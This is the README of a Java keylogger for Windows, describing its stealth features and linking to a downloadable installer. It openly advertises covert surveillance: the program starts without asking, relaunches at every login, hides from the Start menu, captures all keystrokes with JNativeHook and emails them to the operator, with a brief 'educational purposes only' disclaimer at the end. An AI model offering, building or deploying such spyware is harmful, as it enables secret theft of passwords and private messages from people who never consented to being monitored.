# Keylogger Application

This is a keylogger application built using Java and bundled with JRE 1.8 (32-bit) to ensure compatibility across different versions of Windows (both 32-bit and 64-bit). The app was converted into an executable file using Launch4j and packaged with an installer using Inno Setup.

## Features

- **Cross-Compatibility**: The application works on both 32-bit and 64-bit Windows operating systems. It automatically installs in the appropriate folder (`Program Files` for 32-bit and `Program Files (x86)` for 64-bit).
- **Automatic Startup**: Once installed, the application immediately starts without asking the user. For remaining hidden and to constantly register everything typed on the keyboard the app starts even after every windows login.
- **Stealth Mode**: The application is hidden from the Start menu and runs in the background without being visible to the user.
- **Bundled JRE**: The installer includes a 32-bit version of JRE 1.8, so no separate Java installation is required for running the application.

## How It Works

- The application operates as a **background Java process**.
- It uses several additional libraries, including:
  - `JNativeHook` for capturing global key events.
  - `smtp`, `imap`, and `mailapi` for handling email communication.
- After recording the keystrokes, the data is automatically sent to your email for monitoring purposes.

## Installation

1. Download the exe file from https://drive.google.com/drive/folders/1_77PzRXjYx5mclMjcR2G5dQr3ChSnLUD
2. Double-click the setup file to start the installation process.
3. The installation is straightforward and fast. Simply click the `Install` button to proceed.
4. If the operating system is 32-bit, the application will be installed in `Program Files`. For 64-bit systems, it will be installed in `Program Files (x86)`.
5. After installation, the application will launch automatically.
6. Once the installation is complete, click `Finish` to close the setup window.

## License

This project is for educational purposes only. Unauthorized use of keyloggers can violate privacy laws. Use responsibly and ensure compliance with local regulations.
